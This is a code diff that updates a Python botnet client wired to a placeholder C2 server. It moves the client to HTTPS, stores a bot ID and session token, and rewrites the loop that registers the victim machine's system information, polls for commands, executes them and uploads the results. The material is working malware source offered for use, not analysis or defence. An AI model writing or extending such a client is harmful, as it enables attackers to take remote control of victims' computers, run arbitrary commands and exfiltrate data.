@@ -16,7 +16,8 @@ from Crypto.Cipher import AES, DES3
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 
-SERVER_URL = "http://your-c2-server.com:80"
+SERVER_URL = "https://your-c2-server.com:8443"   # use HTTPS
+BOT_ID, SESSION_TOKEN = None, None
 
 def encrypt_data(data, key):
     cipher = AES.new(key, AES.MODE_CBC)
@@ -44,29 +45,29 @@ def get_system_info():
     }
 
 def send_registration():
-    system_info = get_system_info()
-    response = requests.post(f"{SERVER_URL}/bot/register", json=system_info)
-    if response.status_code == 200:
-        return response.json().get('session_token')
-    else:
-        print(f"Registration failed: {response.text}")
-        return None
+    global BOT_ID, SESSION_TOKEN
+    payload = get_system_info()
+    r = requests.post(f"{SERVER_URL}/bot/register", json=payload, timeout=10)
+    if r.ok:
+        data = r.json()
+        BOT_ID, SESSION_TOKEN = data["bot_id"], data["session_token"]
+        return True
+    print("Registration failed →", r.text); return False
 
-def receive_commands(session_token):
-    headers = {'Authorization': f'Bearer {session_token}'}
-    response = requests.get(f"{SERVER_URL}/bot/command", headers=headers)
-    if response.status_code == 200:
-        return response.json()
-    else:
-        print(f"Failed to receive commands: {response.text}")
-        return []
 
-def send_command_result(command_id, result, session_token):
-    headers = {'Authorization': f'Bearer {session_token}'}
-    data = {'command_id': command_id, 'result': result}
-    response = requests.post(f"{SERVER_URL}/bot/result", json=data, headers=headers)
-    if response.status_code != 200:
-        print(f"Failed to send command result: {response.text}")
+def poll_command():
+    headers = {"X-Session-Token": SESSION_TOKEN}
+    r = requests.get(f"{SERVER_URL}/bot/command/{BOT_ID}", headers=headers, timeout=10)
+    return r.json() if r.ok else {"status": "error", "error": r.text}
+
+
+def send_result(cmd_id, result):
+    headers = {"X-Session-Token": SESSION_TOKEN}
+    r = requests.post(f"{SERVER_URL}/bot/result/{cmd_id}", json={"result": result},
+                      headers=headers, timeout=10)
+    if not r.ok:
+        print("Result upload failed →", r.text)
+
 
 def execute_command(command, args):
     try:
@@ -143,19 +144,17 @@ def delete_file(args):
         return f"File {file_path} not found"
 
 def main():
-    session_token = send_registration()
-    if not session_token:
+    if not send_registration():
         return
-
     while True:
-        commands = receive_commands(session_token)
-        for command in commands:
-            command_id = command['id']
-            cmd = command['command']
-            args = command.get('args', {})
-            result = execute_command(cmd, args)
-            send_command_result(command_id, result, session_token)
-        time.sleep(5)
+        cmd = poll_command()
+        if cmd.get("status") == "no_command":
+            time.sleep(5); continue
+        if "command" in cmd:
+            res = execute_command(cmd["command"], cmd.get("args", {}))
+            send_result(cmd["id"], res)
+        time.sleep(2)
+
 
 if __name__ == "__main__":
     main()
